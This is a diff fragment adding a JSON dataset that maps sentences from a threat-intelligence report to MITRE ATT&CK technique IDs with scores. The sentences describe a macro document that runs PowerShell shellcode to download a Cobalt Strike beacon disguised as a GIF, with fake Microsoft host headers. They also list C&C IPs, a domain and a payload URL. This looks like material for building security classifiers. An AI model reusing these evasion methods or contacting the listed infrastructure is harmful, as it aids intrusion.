+      {
+        "sentence": "Note: The document will crash in this case but if fixed to run, the Zscaler Cloud Sandbox will block its activity.",
+        "score": 0.3024
+      },
+      {
+        "sentence": "Conclusion Threat actors always try to find ways to blend into real traffic.",
+        "score": 0.5341
+      },
+      {
+        "sentence": "In this case. they are using an SSL/TLS connection and a host header set to a legitimate Microsoft website.",
+        "score": 0.5721
+      },
+      {
+        "sentence": "One such evasion trick that we covered in our earlier blog was the use of FakeTLS header.",
+        "score": 0.4711
+      },
+      {
+        "sentence": "A complete list of techniques can be found here.",
+        "score": 0.3027
+      }
+    ],
+    "T1071": [
+      {
+        "sentence": "Key points - The attack is fileless as no payload is written on disk and no persistence is created. - The shellcode uses a fake HTTP host field while communicating with the command and control (C&C) server to download the shellcode. - It uses the DKMC framework to hide communication in plain sight using steganography. - It relies on the Cobalt Strike beacon using a malleable C&C profile.",
+        "score": 0.689
+      },
+      {
+        "sentence": "The document is named “India-China border tensions.doc” and contains an article by The Times of India article about the same topic.",
+        "score": 0.3039
+      },
+      {
+        "sentence": "Figure 1: The infection flow of this attack.",
+        "score": 0.3568
+      },
+      {
+        "sentence": "Figure 2: The malicious document containing a new article reference.",
+        "score": 0.3136
+      },
+      {
+        "sentence": "Interestingly, the document contained corrupted macro code leading us to believe that it was built in a hurry using some automated macro obfuscation tool without proper testing.",
+        "score": 0.3044
+      },
+      {
+        "sentence": "Though the macro is corrupt, we were able to extract the PowerShell command using static analysis.",
+        "score": 0.3574
+      },
+      {
+        "sentence": "The code obfuscation is very basic.",
+        "score": 0.3653
+      },
+      {
+        "sentence": "It just subtracts value 4 to decrypt the PowerShell command.",
+        "score": 0.3843
+      },
+      {
+        "sentence": "Figure 3: The macro command decryption function.",
+        "score": 0.3872
+      },
+      {
+        "sentence": "Part of the PowerShell command after the base64 decoding looks like this: Figure 4: Part of the PowerShell code designed to run shellcode.",
+        "score": 0.4097
+      },
+      {
+        "sentence": "Almost exact code from the DKMC framework is used to run embedded base64 encoded shellcode.",
+        "score": 0.4089
+      },
+      {
+        "sentence": "The PowerShell script is designed to run the shellcode in 32-bit mode only.",
+        "score": 0.3122
+      },
+      {
+        "sentence": "It checks if the PowerShell script is running with a 64-bit PowerShell process using the command int pointer size, which will be 8 bytes [64bits] on a 64-bit process.",
+        "score": 0.3563
+      },
+      {
+        "sentence": "If that is the case, then it tries to run the PowerShell in 32-bit mode with the shellcode injection script code as an argument.",
+        "score": 0.307
+      },
+      {
+        "sentence": "Injected shellcode This shellcode on execution downloads another shellcode but with a valid GIF header, again borrowing a technique from DKMC.",
+        "score": 0.4861
+      },
+      {
+        "sentence": "Interestingly, this shellcode uses a fake HTML host header and a predefined User-Agent field, in this case, to download a GIF payload from the C&C IP over HTTPS.",
+        "score": 0.6093
+      },
+      {
+        "sentence": "Figure 5: The shellcode starting with well-known module list access instructions.",
+        "score": 0.3052
+      },
+      {
+        "sentence": "C&C IP: 47.240.73.77 Request example: GET /avatar_32px.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host: update.windows.microsoft.com Connection: Keep-Alive Cache-Control: no-cache Downloaded payload This GIF file, just after the GIF magic bytes [“GIF89a” in this case, which is also a valid assembly instruction] contains a shellcode followed by an XOR-encrypted payload.",
+        "score": 0.5727
+      },
+      {
+        "sentence": "The shellcode decrypts and executes this payload, which turns out to be a Cobalt Strike beacon.",
+        "score": 0.4822
+      },
+      {
+        "sentence": "Figure 6: The shellcode and payload before decryption.",
+        "score": 0.4397
+      },
+      {
+        "sentence": "Figure 7: The shellcode and payload after decryption.",
+        "score": 0.4606
+      },
+      {
+        "sentence": "The beacon is configured to point to the following C&C address “userimage8.360doc.com,/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books” and the same host field and user agent.",
+        "score": 0.5421
+      },
+      {
+        "sentence": "In another instance, we found a .NET payload, which injects an RSA-encrypted payload into a notepad.exe file after decryption with the MD5: 9c2ee383d235a702c5ad70b1444efb4d In this case, the beacon payload is downloaded from https://114.67.110[.]37/QBah.",
+        "score": 0.4499
+      },
+      {
+        "sentence": "The shellcode and additional payload are similar except for the C&C addresses.",
+        "score": 0.5228
+      },
+      {
+        "sentence": "Noticeably, both beacon DLLs use a 360doc.com-based C&C, and the watermark is exactly the same in both: 305419896.",
+        "score": 0.4691
+      },
+      {
+        "sentence": "The group OceanLotus is known to use DKMC, Cobalt Strike, and fileless payloads.",
+        "score": 0.3698
+      },
+      {
+        "sentence": "But the use of a proper GIF header for shellcode seems to be new for them.",
+        "score": 0.3978
+      },
+      {
+        "sentence": "On the other hand, the watermark value (305419896) found in the beacon configuration has also been used by the Trickbot Group.",
+        "score": 0.3798
+      },
+      {
+        "sentence": "Check out our Threat Library for more details about Win32.Backdoor.CobaltStrike.",
+        "score": 0.3008
+      },
+      {
+        "sentence": "Conclusion Threat actors always try to find ways to blend into real traffic.",
+        "score": 0.5241
+      },
+      {
+        "sentence": "In this case. they are using an SSL/TLS connection and a host header set to a legitimate Microsoft website.",
+        "score": 0.587
+      },
+      {
+        "sentence": "One such evasion trick that we covered in our earlier blog was the use of FakeTLS header.",
+        "score": 0.486
+      },
+      {
+        "sentence": "Acknowledgment Thanks to Adtiya Sharma for providing support in the research.",
+        "score": 0.3073
+      },
+      {
+        "sentence": "A complete list of techniques can be found here.",
+        "score": 0.3618
+      }
+    ]
+  }
+}
